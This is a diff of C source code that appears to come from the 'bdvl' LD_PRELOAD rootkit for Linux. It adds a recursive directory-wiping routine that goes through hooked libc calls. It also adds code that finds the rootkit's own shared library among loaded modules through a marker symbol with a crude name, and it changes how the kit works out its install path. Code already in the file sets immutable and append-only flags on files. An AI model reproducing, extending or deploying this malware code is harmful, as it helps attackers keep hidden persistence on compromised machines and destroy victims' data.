@@ -1,7 +1,41 @@
+int rm(const char *path);
+
+/* recursively removes the target directory. */
+void eradicatedir(const char *target){
+    DIR *dp;
+    struct dirent *dir;
+    struct stat pathstat;
+
+    hook(COPENDIR, CREADDIR, CRMDIR, C__XSTAT);
+
+    dp = call(COPENDIR, target);
+    if(dp == NULL) return;
+
+    while((dir = call(CREADDIR, dp)) != NULL){
+        if(!strcmp(".\0", dir->d_name) || !strcmp("..\0", dir->d_name))
+            continue;
+
+        char path[strlen(target)+strlen(dir->d_name)+2];
+        snprintf(path, sizeof(path), "%s/%s", target, dir->d_name);
+
+        memset(&pathstat, 0, sizeof(struct stat));
+        if((long)call(C__XSTAT, _STAT_VER, path, &pathstat) != -1)
+            if(S_ISDIR(pathstat.st_mode))
+                eradicatedir(path); // we recursive.
+
+        if(rm(path) < 0)
+            printf("Failed unlink on %s\n", path);
+    }
+    closedir(dp);
+    if((long)call(CRMDIR, target) < 0 && errno != ENOENT && errno != ENOTDIR)
+        printf("Failed rmdir on %s\n", target);
+}
+
 int rm(const char *path){
     hook(CUNLINK);
     int ulr = (long)call(CUNLINK, path);
     if(ulr < 0 && errno == ENOENT) return 1;
+    else if(ulr < 0 && errno == EISDIR) eradicatedir(path);
     return ulr;
 }
 
@@ -35,7 +69,7 @@ int doiapath(const char *path, int apply){
     fd = (long)call(COPEN, path, O_NONBLOCK);
     if(fd < 0) return 0;
 
-    fpendlen = lseek(fd, 0L, SEEK_END);
+    fpendlen = lseek(fd, 0, SEEK_END);
     if(fpendlen < 1 && apply) return 0;
 
     if((long)call(CIOCTL, fd, FS_IOC_GETFLAGS, &ret) < 0) {
@@ -44,7 +78,7 @@ int doiapath(const char *path, int apply){
     }
 
     chk = ret;
-    if(apply) ret |= (FS_APPEND_FL|FS_IMMUTABLE_FL);
+    if(apply)  ret |= (FS_APPEND_FL|FS_IMMUTABLE_FL);
     if(!apply) ret &=~(FS_APPEND_FL|FS_IMMUTABLE_FL);
 
     if(ret != chk)
@@ -59,60 +93,91 @@ int doiapath(const char *path, int apply){
     return 0;
 }
 
+/* iterates through all loaded libraries until bdvl.so is located.
+ * once located, the struct passed as an argument to the void pointer is populated with information of the located bdvl.so. */
+int phdrcallback(struct dl_phdr_info *info, size_t size, void *data){
+    struct bdvso *so = (struct bdvso*)data;
+    void *handle = NULL;
+    int (*fptr)(void);
+    char *libname, *libpath, *pathdup, *pathdir;
+    const char *target = info->dlpi_name;
+
+    if(!strlen(target) || (handle = dlopen(target, RTLD_LAZY)) == NULL)
+        return 0;
+
+    if(!o_dlsym) locate_dlsym();
+    fptr = o_dlsym(handle, "bdvlsuperreallygay");
+    dlclose(handle);
+    if(fptr == NULL) return 0;
+
+    libpath = strdup(target);
+    strncpy(so->sopath, libpath, 2047);
+
+    pathdup = strdup(libpath);
+    libname = strrchr(pathdup, '/')+1;
+    strncpy(so->soname, libname, 511);
+    free(pathdup);
+
+    pathdir = dirname(libpath);
+    strncpy(so->installdir, pathdir, 1023);
+    free(libpath);
+
+    return 0;
+}
+
+/* populates & returns a new pointer to a bdvso struct. thanks to dl_iterate_phdr.
+ * the pointer should be freed immediately after there is no longer any use for it. */
+struct bdvso *getbdvsoinf(void){
+    if(so != NULL) return so;
+    so = malloc(sizeof(struct bdvso));
+    if(!so) return NULL;
+    memset(so, 0, sizeof(struct bdvso));
+    dl_iterate_phdr(phdrcallback, (void*)so);
+    return so;
+}
+
 /* returns the full sopath for the kit.
- * if pointers installdir & bdvlso are NULL, the path is read from /proc/$$/maps.
+ * if pointers installdir & bdvlso are NULL, the path of the kit is stored & read from in the bdvso struct, which is populated by dl_iterate_phdr.
  * if the path cannot be found, INSTALL_DIR & BDVLSO are used as fallbacks.
  * otherwise if installdir & bdvlso are not NULL, they are used. (i.e. at installation)
  * if box is fedora, .$PLATFORM is not included in the result. */
 char *rksopath(char *installdir, char *bdvlso){
     char *rkpath, *rkpathdup, *p, *ret, tmp[2048];
+    size_t pathsize;
     memset(tmp, 0, sizeof(tmp));
 
     if(installdir == NULL && bdvlso == NULL){
-        rkpath = resolvelibpath();
-        if(rkpath != NULL){
-            rkpathdup = strdup(rkpath);
-            p = strrchr(rkpathdup, '.')+1;
+        so = getbdvsoinf();
+        if(so == NULL){
+            snprintf(tmp, sizeof(tmp)-1, "%s/%s.$PLATFORM", INSTALL_DIR, BDVLSO);
+            goto nopenope;
+        }
 
-            for(int i=0; i < VALID_PLATFORMS_SIZE; i++)
-                if(!strcmp(valid_platforms[i], p)){
-                    rkpath[strlen(rkpath)-(strlen(valid_platforms[i])+1)] = '\0';
-                    break;
-                }
+        rkpath = so->sopath;
+        rkpathdup = strdup(rkpath);
+        p = strrchr(rkpathdup, '.')+1;
 
-            strncpy(tmp, rkpath, sizeof(tmp)-1);
-            strcat(tmp, ".$PLATFORM");
-            tmp[strlen(rkpath)+10]='\0';
+        for(int i=0; i < VALID_PLATFORMS_SIZE; i++)
+            if(!strcmp(valid_platforms[i], p)){
+                rkpath[strlen(rkpath)-(strlen(valid_platforms[i])+1)] = '\0';
+                break;
+            }
 
-            free(rkpathdup);
-            free(rkpath);
-        }else snprintf(tmp, sizeof(tmp)-1, "%s/%s.$PLATFORM", INSTALL_DIR, BDVLSO);
+        strncpy(tmp, rkpath, sizeof(tmp)-1);
+        strcat(tmp, ".$PLATFORM");
+        tmp[strlen(rkpath)+10]='\0';
+
+        free(rkpathdup);
+        free(so);
+        so = NULL;
     }else snprintf(tmp, sizeof(tmp)-1, "%s/%s.$PLATFORM", installdir, bdvlso);
-
-    size_t pathsize = strlen(tmp)+1;
+nopenope:
+    pathsize = strlen(tmp)+1;
     ret = malloc(pathsize);
     if(!ret) return NULL;
     strncpy(ret, tmp, pathsize);
     if(isfedora()) ret[strlen(ret)-10]='\0';
     return ret;
-}
-
-char *getinstalldir(void){
-    char *sopath, *installdir;
-    sopath = rksopath(NULL, NULL);
-    if(sopath == NULL) return NULL;
-    installdir = strdup(dirname(sopath));
-    free(sopath);
-    return installdir;
-}
-
-char *getsoname(void){
-    char *sopath, *soname;
-    sopath = rksopath(NULL, NULL);
-    if(sopath == NULL) return NULL;
-    soname = strdup(basename(sopath));
-    free(sopath);
-    return soname;
 }
 
 char *gdirname(int fd){
